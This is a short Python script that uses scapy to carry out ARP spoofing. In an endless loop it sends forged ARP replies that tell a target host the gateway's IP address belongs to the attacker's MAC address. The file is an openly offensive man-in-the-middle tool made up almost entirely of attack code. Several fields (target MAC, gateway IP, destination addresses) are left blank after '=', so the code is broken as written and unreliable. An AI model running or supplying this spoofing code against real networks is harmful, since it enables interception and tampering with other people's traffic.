# -*- coding: utf-8 -*-
from scapy.all import *
import time
import sys

def ethernet(targetIP):
    eth = Ether()
    eth.dst = #target mac
    eth.type = 0x0806
    print(eth)
    return eth


def arpPacket(targetIP):
    arp = ARP()
    arp.hwlen = 6
    arp.plen = 4
    arp.op = 2
    arp.psrc = #gateway ip
    # arp.hwsrc is default to my own host(the attacker's mac)
    arp.pdst = #
    arp.hwdst = #
    print(arp)
    return arp


def sendPacket(targetIP):
    eth = ethernet(targetIP)
    arp = arpPacket(targetIP)
    packet = eth / arp
    sendp(packet,iface='ens33')  #'ens33' may be different in your computer

if __name__ == '__main__':
    targetIP = sys.argv[1]
    while True:
        sendPacket(targetIP)
        time.sleep(1)
        # exit(0)

